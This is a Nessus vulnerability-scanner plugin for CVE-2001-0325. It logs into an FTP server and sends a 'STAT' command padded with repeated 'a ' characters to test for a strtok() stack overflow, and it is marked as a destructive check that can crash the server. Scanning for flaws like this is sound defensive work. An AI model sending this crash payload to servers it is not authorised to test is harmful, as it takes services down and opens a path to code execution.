#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10692);
 script_bugtraq_id(2342);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2001-0325");

 name["english"] = "ftpd strtok() stack overflow";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote FTP server seems to be vulnerable to a stack
overflow when calling the strok() function.
For instance, the command :

STAT a a a a a a a  (...) a a a a

Will make it crash.

An attacker may use this flaw to execute arbitrary code on
the remote host.

Solution : change ftp servers
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "strock() stack overflow";

 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "FTP";
 family["francais"] = "FTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include('ftp_func.inc');
port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(get_port_state(port))
{
login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");


if(login)
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 if(ftp_authenticate(socket:soc, user:login,pass:password))
 {
 crp = crap(data:"a ", length:320);
 req = string("STAT ", crp, "\r\n");
 send(socket:soc, data:req);
 r = recv_line(socket:soc, length:4096);
 if(!r)
 {
  security_hole(port);
  exit(0);
 }
 data = string("QUIT\r\n");
 send(socket:soc, data:data);
 }
 close(soc);
 }
}
